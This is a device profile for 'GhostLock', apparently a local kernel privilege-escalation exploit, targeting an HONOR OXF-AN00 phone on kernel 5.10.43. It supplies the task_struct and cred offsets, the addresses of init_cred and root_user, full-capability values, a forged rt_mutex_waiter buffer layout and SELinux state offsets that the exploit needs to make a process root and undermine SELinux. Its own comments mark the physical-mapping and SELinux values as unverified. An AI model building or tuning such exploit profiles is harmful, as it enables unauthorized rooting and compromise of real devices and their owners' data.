# GhostLock 5.10.43 profile for HONOR OXF-AN00 (Kirin 990 / kirin990), HarmonyOS 4.2.0.125
# Release verified on device: 5.10.43 #1 SMP PREEMPT Tue Sep 22 09:21:41 CST 2026
# Kernel image: BOOT.img (Android boot v2, gzip payload @0x800) -> Image, matches the
# running kernel string byte for byte (HarmonyOS@localhost, clang 12.0.7).
#
# All offset.* are offsets from _text = 0xffffffc010000000 (kallsyms recovered from
# the decompressed Image). All task_struct/cred offsets below were re-derived from
# that same image (init_task data + disassembly of remove_waiter / __secure_computing /
# __sched_setscheduler / cred_init), not copied from another device.
#
# status: offsets verified statically; NOT yet executed on device.
release = "5.10.43"
schema_version = 1
kernel_major = 5
recommend_shizuku = 0

# ---- physical mapping (UNVERIFIED, requires the probe described in the notes) ----
# The tool resolves an image address as   PAGE_OFFSET(soc) + kernel_phys_offset + offset.
# On the failed run (kernel_phys_offset = null) it used 0x80000000 and produced
# init_cred = 0xffffffc0834a46a0, i.e. base 0xffffffc080000000, while this kernel is
# linked at 0xffffffc010000000. To land the base on _text the value below must make
#   PAGE_OFFSET(soc) + kernel_phys_offset == 0xffffffc010000000
# For the standard 39-bit arm64 PAGE_OFFSET 0xffffffc000000000 that means 0x10000000.
kernel_phys_load = 268435456          # 0x10000000 (same hypothesis as below)
kernel_phys_offset = 268435456        # 0x10000000

route {
  multicast_waiter {
    waiter_off = 96                  # rt_mutex_waiter base inside the forged buffer
    buffer_size = 264
    task_offset = 48                 # rt_mutex_waiter::task   @0x30 (verified)
    lock_offset = 56                 # rt_mutex_waiter::lock   @0x38 (verified)
    compact_waiter = 1
  }
}
fallback {
  to = "none"
}
kernelsnitch {
  collisions = 8
  mm_struct_sz = 1024
}
task_struct {
  prio = 288                       # 0x120 (ldr [x21,#0x120] in __sched_setscheduler)
  normal_prio = 292                # 0x124 (verified)
  sched_task_group = 704           # 0x2c0 (init_task holds root_task_group)
  pi_lock = 2260                   # 0x8d4 (add x21, current, #0x8d4 in remove_waiter)
  pi_waiters = 2280                # 0x8e8 (add x1, current, #0x8e8)
  pi_top_task = 2296               # 0x8f8 (after 16-byte rb_root_cached)
  pi_blocked_on = 2304             # 0x900 (str xzr, [current, #0x900])
  pid = 1600                       # 0x640
  tgid = 1604                      # 0x644
  atomic_flags = 1544              # 0x608 (restart_block.fn @0x610 = 0xffffffc01240270c)
  real_cred = 2040                 # 0x7f8 (init_task -> init_cred)
  cred = 2048                      # 0x800 (init_task -> init_cred)
  comm = 2064                      # 0x810 ("swapper")
  tasks = 1336                     # 0x538 (empty list head, self pointer)
  seccomp = 2224                   # 0x8b0 (ldr w9, [current, #0x8b0] in __secure_computing)
}
cred {
  copy_size = 168                  # 0xa8, kmem_cache_create("cred_jar", 0xa8, ...) in cred_init
  usage_offset = 0
  usage_value = 1
  caps_offset = 40
  caps_count = 5
  caps_value = -1
  ref_count = 3
  ref0_offset = 128                # ->user       = root_user
  ref1_offset = 136                # ->user_ns    = init_user_ns
  ref2_offset = 144                # ->group_info = init_groups
  ref3_offset = null
  # absolute image addresses (= _text + symbol offset), verified in this kernel
  ref0_image = -274554276608       # 0xffffffc0134a3500 root_user
  ref1_image = -274554277144       # 0xffffffc0134a32e8 init_user_ns
  ref2_image = -274554271928       # 0xffffffc0134a4748 init_groups
  ref3_image = null
}
offset {
  init_task = 55134144             # 0x034947c0 -> 0xffffffc0134947c0
  init_cred = 55199392             # 0x034a46a0 -> 0xffffffc0134a46a0
  empty_zero_page = 63438848       # 0x03c80000
  root_task_group = 63465344       # 0x03c86780
  # NOTE: this points at struct selinux_state itself (0xffffffc013e13ac8).
  # selinux_init() writes checkreqprot to selinux_state+0 in this kernel, so +0 is
  # NOT enforcing. The offset of .enforcing inside the struct is still unresolved
  # (layout is randomised / DEVELOP build flag unclear). Do not rely on this until
  # verified - see notes.
  selinux_enforcing = 65092296     # 0x03e13ac8 selinux_state
  selinux_blob_sizes = 39981192    # 0x02621088
  security_hook_heads = 39979512   # 0x026209f8
  slide_nfulnl_logger = 55085264   # 0x034888d0 nfulnl_logger
  slide_loggers_0_1 = 55085048     # 0x034887f8 loggers  (was 55085064 = loggers+0x10)
  slide_boot_id = 65248476         # 0x03e39cdc sysctl_bootid
}
